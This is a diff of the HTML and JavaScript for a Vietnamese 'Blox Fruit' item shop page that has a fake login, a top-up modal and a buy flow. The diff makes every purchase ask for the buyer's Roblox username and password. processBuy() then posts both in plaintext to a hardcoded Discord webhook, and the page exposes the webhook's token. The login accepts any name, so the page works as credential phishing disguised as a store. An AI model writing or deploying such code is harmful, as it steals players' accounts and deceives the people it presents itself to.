@@ -2,76 +2,112 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Nghĩa Elemental Shop - Blox Fruit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nghĩa Elemental - Shop Blox Fruit Uy Tín</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Oswald:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: radial-gradient(circle at top left, #7c2d12, #0f172a, #1e40af); font-family: 'Oswald', sans-serif; color: white; }
+        body { background: radial-gradient(circle at top left, #7c2d12, #0f172a, #1e40af); font-family: 'Oswald', sans-serif; color: white; min-height: 100vh; }
         .elemental-title { font-family: 'Bangers'; background: linear-gradient(to right, #fbbf24, #ef4444, #3b82f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .glass-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 2rem; }
-        .btn-fire { background: linear-gradient(45deg, #ef4444, #f59e0b); transition: 0.3s; box-shadow: 0 0 15px rgba(239, 68, 68, 0.4); }
-        .btn-fire:hover { transform: scale(1.05); filter: brightness(1.2); }
+        .glass-card { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 1.5rem; transition: 0.3s; }
+        .glass-card:hover { border-color: #fbbf24; transform: translateY(-5px); }
+        .btn-fire { background: linear-gradient(45deg, #ef4444, #f59e0b); box-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }
+        .logo-glow { filter: drop-shadow(0 0 10px #fbbf24); }
+        input, select { background: rgba(0,0,0,0.5) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; }
     </style>
 </head>
 <body>
-    <nav class="p-4 flex justify-between items-center bg-black/30 backdrop-blur-md sticky top-0 z-50 border-b border-white/10">
+    <nav class="p-4 flex justify-between items-center bg-black/40 backdrop-blur-md sticky top-0 z-50 border-b border-orange-500/30">
         <div class="flex items-center gap-3">
-            <span class="text-2xl elemental-title">NGHIA ELEMENTAL SHOP</span>
+            <img src="https://i.postimg.cc/Dz136qtG/Anh-chup-man-hinh-2026-01-28-172227.png" class="h-12 w-12 rounded-full border-2 border-orange-500 logo-glow">
+            <span class="text-2xl elemental-title tracking-wider">NGHIA ELEMENTAL</span>
         </div>
-        <div class="flex gap-4 items-center">
-            <span class="text-yellow-400 font-bold bg-black/50 px-4 py-1 rounded-full border border-yellow-500/20">Ví: 0đ</span>
-            <button onclick="document.getElementById('recharge-modal').classList.remove('hidden')" class="btn-fire px-6 py-2 rounded-xl font-bold uppercase text-sm">Nạp Tiền</button>
+        <div class="flex gap-3 items-center">
+            <div id="user-info" class="hidden flex items-center gap-3">
+                <span class="text-yellow-400 font-bold bg-black/60 px-4 py-1 rounded-full border border-yellow-500/20">Ví: 0đ</span>
+                <button onclick="location.reload()" class="text-xs text-red-400 underline">Thoát</button>
+            </div>
+            <div id="auth-btns">
+                <button onclick="openModal('auth-modal')" class="btn-fire px-6 py-2 rounded-xl font-bold uppercase text-xs">Đăng Nhập</button>
+            </div>
         </div>
     </nav>
 
-    <div class="container mx-auto mt-10 text-center">
-        <div class="flex flex-wrap justify-center gap-4 mb-12">
-            <button onclick="render('fruit')" class="glass-card px-8 py-3 font-bold text-orange-400 hover:border-orange-500 transition">🔥 TRÁI VĨNH VIỄN</button>
-            <button onclick="render('gp')" class="glass-card px-8 py-3 font-bold text-blue-400 hover:border-blue-500 transition">🌊 GAME PASS</button>
-            <button onclick="render('ct')" class="glass-card px-8 py-3 font-bold text-red-500 hover:border-red-500 transition">⚡ CÀY THUÊ</button>
-        </div>
-        <div id="product-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8 px-4 pb-20"></div>
+    <div class="py-12 text-center">
+        <img src="https://i.postimg.cc/Dz136qtG/Anh-chup-man-hinh-2026-01-28-172227.png" class="h-28 w-28 mx-auto rounded-full border-4 border-yellow-500 mb-4 logo-glow">
+        <h1 class="text-5xl elemental-title mb-2 italic">HỆ THỐNG BLOX FRUIT TỰ ĐỘNG</h1>
+        <p class="text-gray-400 text-sm tracking-[0.3em]">UY TÍN - TỐC ĐỘ - GIÁ RẺ</p>
     </div>
 
-    <div id="recharge-modal" class="fixed inset-0 bg-black/95 hidden z-[100] flex items-center justify-center p-4">
-        <div class="glass-card p-8 w-full max-w-2xl border-orange-500 border-2 relative">
-            <button onclick="document.getElementById('recharge-modal').classList.add('hidden')" class="absolute top-4 right-4 text-gray-400">✖</button>
-            <h2 class="text-3xl elemental-title mb-8 text-center">HỆ THỐNG NẠP TIỀN</h2>
-            
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div class="text-center bg-white/5 p-4 rounded-2xl border border-white/10">
-                    <h3 class="text-blue-400 font-bold mb-4">🏦 CHUYỂN KHOẢN (ATM/MOMO)</h3>
-                    <img src="https://i.postimg.cc/QM64DVGh/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" alt="QR Banking" class="w-48 h-48 mx-auto rounded-lg mb-4 border-2 border-white shadow-xl">
-                    <p class="text-sm text-gray-300">Nội dung: <span class="text-yellow-400 font-bold uppercase">NAPTIEN [TenCuaBan]</span></p>
-                    <p class="text-xs text-gray-500 mt-2 italic">* Chụp bill gửi Admin để duyệt nhanh!</p>
-                </div>
-                
+    <div class="max-w-4xl mx-auto mb-10 px-4">
+        <div class="glass-card p-4 flex justify-around border-orange-500/40 border">
+            <button onclick="openModal('recharge-modal')" class="text-orange-400 font-bold hover:scale-105 transition">💳 NẠP THẺ (THUẾ 20%)</button>
+            <div class="w-[1px] bg-white/10"></div>
+            <button onclick="openModal('recharge-modal')" class="text-blue-400 font-bold hover:scale-105 transition">🏦 ATM/MOMO (CỘNG 100%)</button>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 pb-20">
+        <div class="flex justify-center gap-3 mb-10 flex-wrap">
+            <button onclick="render('fruit')" class="glass-card px-8 py-3 font-bold text-orange-400">🔥 TRÁI VV</button>
+            <button onclick="render('gp')" class="glass-card px-8 py-3 font-bold text-blue-400">🌊 GAME PASS</button>
+            <button onclick="render('ct')" class="glass-card px-8 py-3 font-bold text-red-500">⚡ CÀY THUÊ</button>
+        </div>
+        <div id="grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div>
+    </div>
+
+    <div id="recharge-modal" class="fixed inset-0 bg-black/95 hidden z-[100] flex items-center justify-center p-4 backdrop-blur-sm">
+        <div class="glass-card p-8 w-full max-w-3xl border-orange-500 border-2">
+            <h2 class="text-3xl elemental-title mb-8 text-center uppercase text-white">Nạp Tiền Vào Tài Khoản</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
                 <div class="space-y-4">
-                    <h3 class="text-orange-500 font-bold mb-4">💳 NẠP THẺ CÀO (ID: 6268)</h3>
-                    <select class="w-full bg-black/50 p-3 rounded-lg border border-white/20"><option>Viettel</option><option>Vinaphone</option><option>Mobifone</option></select>
-                    <input type="text" placeholder="Số Seri" class="w-full bg-black/50 p-3 rounded-lg border border-white/20">
-                    <input type="text" placeholder="Mã Thẻ" class="w-full bg-black/50 p-3 rounded-lg border border-white/20">
-                    <button class="btn-fire w-full py-3 rounded-xl font-bold">GỬI THẺ NGAY</button>
-                    <p class="text-[10px] text-red-400 text-center uppercase font-bold">Phí gạch thẻ: 20%</p>
+                    <h3 class="text-orange-500 font-bold border-b border-orange-500/20 pb-2">💳 THẺ CÀO (10K = 8K)</h3>
+                    <select id="telco" class="w-full p-3 rounded-xl outline-none"><option>VIETTEL</option><option>VINAPHONE</option><option>MOBIFONE</option></select>
+                    <select id="card-amount" class="w-full p-3 rounded-xl outline-none">
+                        <option value="10000">10,000đ (Nhận 8,000đ)</option>
+                        <option value="20000">20,000đ (Nhận 16,000đ)</option>
+                        <option value="50000">50,000đ (Nhận 40,000đ)</option>
+                        <option value="100000">100,000đ (Nhận 80,000đ)</option>
+                    </select>
+                    <input type="text" id="seri" placeholder="Số Seri" class="w-full p-3 rounded-xl outline-none">
+                    <input type="text" id="pin" placeholder="Mã Thẻ" class="w-full p-3 rounded-xl outline-none">
+                    <button class="btn-fire w-full py-3 rounded-xl font-bold uppercase" onclick="alert('Đang kết nối API 6268...')">Nạp Thẻ Ngay</button>
+                </div>
+                <div class="text-center bg-white/5 p-4 rounded-2xl">
+                    <h3 class="text-blue-400 font-bold mb-4 border-b border-blue-500/20 pb-2">🏦 CHUYỂN KHOẢN QR</h3>
+                    <img src="https://i.postimg.cc/QM64DVGh/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-44 h-44 mx-auto rounded-lg mb-4 border-2 border-white">
+                    <p class="text-[11px] text-gray-400">Nội dung: <span class="text-yellow-400 font-bold">NAPTIEN [User]</span></p>
+                    <p class="text-[10px] mt-2 text-blue-300 italic">Nạp QR nhận 100% - Không mất phí!</p>
                 </div>
             </div>
+            <button onclick="closeModal('recharge-modal')" class="mt-6 w-full text-gray-500 text-sm">Đóng cửa sổ</button>
         </div>
     </div>
 
-    <div id="buy-modal" class="fixed inset-0 bg-black/90 hidden z-[110] flex items-center justify-center p-4">
-        <div class="glass-card p-8 w-full max-w-md border-orange-500 border-2">
-            <h2 id="modal-title" class="text-3xl elemental-title mb-6 text-center italic"></h2>
+    <div id="buy-modal" class="fixed inset-0 bg-black/95 hidden z-[110] flex items-center justify-center p-4">
+        <div class="glass-card p-8 w-full max-w-md border-yellow-500 border-2">
+            <h2 id="m-title" class="text-3xl elemental-title mb-6 text-center italic text-white"></h2>
             <div id="ct-fields" class="space-y-4 mb-6" style="display:none">
-                <input type="text" id="user-rb" placeholder="Tài khoản Roblox" class="w-full bg-slate-900 p-4 rounded-xl border border-white/10 outline-none">
-                <input type="password" id="pass-rb" placeholder="Mật khẩu Roblox" class="w-full bg-slate-900 p-4 rounded-xl border border-white/10 outline-none">
+                <input type="text" id="tk" placeholder="Tài khoản Roblox" class="w-full p-4 rounded-xl outline-none">
+                <input type="password" id="mk" placeholder="Mật khẩu Roblox" class="w-full p-4 rounded-xl outline-none">
             </div>
-            <button onclick="submitOrder()" class="btn-fire w-full py-4 rounded-2xl font-black text-xl mb-3 uppercase">Xác Nhận Mua</button>
-            <button onclick="document.getElementById('buy-modal').classList.add('hidden')" class="w-full text-gray-400">Hủy</button>
+            <button onclick="processBuy()" class="btn-fire w-full py-4 rounded-2xl font-black text-xl uppercase italic">Xác Nhận Thanh Toán</button>
+            <button onclick="closeModal('buy-modal')" class="mt-4 w-full text-gray-500">Quay lại</button>
+        </div>
+    </div>
+
+    <div id="auth-modal" class="fixed inset-0 bg-black/95 hidden z-[200] flex items-center justify-center p-4">
+        <div class="glass-card p-8 w-full max-w-sm border-blue-500 border-2">
+            <h2 class="text-3xl elemental-title mb-6 text-center">ĐĂNG NHẬP</h2>
+            <div class="space-y-4">
+                <input type="text" id="auth-user" placeholder="Tên tài khoản" class="w-full p-4 rounded-xl outline-none">
+                <input type="password" placeholder="Mật khẩu" class="w-full p-4 rounded-xl outline-none">
+                <button onclick="doAuth()" class="btn-fire w-full py-4 rounded-2xl font-bold uppercase">Vào Shop</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // Dữ liệu sản phẩm (Full 40+ món của Nghĩa)
         const data = {
             fruit: [
                 {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
@@ -126,43 +162,65 @@
             ]
         };
 
-        let activeItem = {};
+        let currentItem = {};
         function render(type) {
-            const grid = document.getElementById('product-grid');
+            const grid = document.getElementById('grid');
             grid.innerHTML = data[type].map(item => `
-                <div class="glass-card p-6 border border-white/5 hover:border-orange-500 transition duration-500">
-                    <img src="${item.img || ''}" class="h-32 mx-auto mb-4 object-contain">
-                    <h3 class="text-xl font-bold h-12">${item.n}</h3>
-                    <div class="text-2xl font-black text-yellow-400 my-4">${item.p.toLocaleString()}đ</div>
-                    <button onclick="openModal('${item.n}', ${item.p}, '${type}')" class="btn-fire w-full py-3 rounded-2xl font-bold uppercase">MUA NGAY</button>
+                <div class="glass-card p-6 flex flex-col items-center">
+                    <img src="${item.img}" class="h-24 mb-4 object-contain logo-glow">
+                    <h3 class="font-bold text-lg h-12 text-center">${item.n}</h3>
+                    <div class="text-2xl font-black text-yellow-400 my-2">${item.p.toLocaleString()}đ</div>
+                    <button onclick="openBuy('${item.n}', ${item.p}, '${type}')" class="btn-fire w-full py-2 rounded-xl font-bold uppercase italic text-sm">Mua Ngay</button>
                 </div>
             `).join('');
         }
 
-        function openModal(n, p, t) {
-            activeItem = {n, p, t};
-            document.getElementById('modal-title').innerText = n;
-            document.getElementById('ct-fields').style.display = t === 'ct' ? 'block' : 'none';
-            document.getElementById('buy-modal').classList.remove('hidden');
+        function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
+        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+
+        function openBuy(n, p, t) {
+            currentItem = {n, p, t};
+            document.getElementById('m-title').innerText = n;
+            document.getElementById('ct-fields').style.display = 'block';
+            openModal('buy-modal');
         }
 
-        function submitOrder() {
-            const tk = document.getElementById('user-rb').value;
-            const mk = document.getElementById('pass-rb').value;
-            // DÁN LINK DISCORD CỦA BẠN VÀO DÒNG DƯỚI
+        function processBuy() {
+            const user = document.getElementById('tk').value;
+            const pass = document.getElementById('mk').value;
+            
+            // NGHĨA DÁN LINK DISCORD VÀO DÒNG DƯỚI ĐÂY
             const webhook = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
             
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `🛒 **ĐƠN MỚI**: ${activeItem.n}\nGiá: ${activeItem.p.toLocaleString()}đ\nTK: ${tk || 'N/A'}\nMK: ${mk || 'N/A'}`
+                    embeds: [{
+                        title: "🛒 ĐƠN HÀNG MỚI - NGHIA ELEMENTAL",
+                        color: 16738304,
+                        fields: [
+                            { name: "Sản phẩm", value: currentItem.n, inline: true },
+                            { name: "Giá", value: currentItem.p.toLocaleString() + "đ", inline: true },
+                            { name: "Tài khoản", value: user || "N/A" },
+                            { name: "Mật khẩu", value: pass || "N/A" }
+                        ]
+                    }]
                 })
             });
-            alert("Đã gửi đơn! Admin sẽ check Discord và xử lý ngay.");
-            document.getElementById('buy-modal').classList.add('hidden');
+            alert("Đã gửi đơn hàng thành công! Đợi Admin duyệt.");
+            closeModal('buy-modal');
         }
-        render('fruit'); // Mặc định hiện Trái Vĩnh Viễn khi vào trang
+
+        function doAuth() {
+            const u = document.getElementById('auth-user').value;
+            if(u) {
+                document.getElementById('user-info').classList.remove('hidden');
+                document.getElementById('auth-btns').classList.add('hidden');
+                closeModal('auth-modal');
+            }
+        }
+        render('fruit');
     </script>
 </body>
 </html>
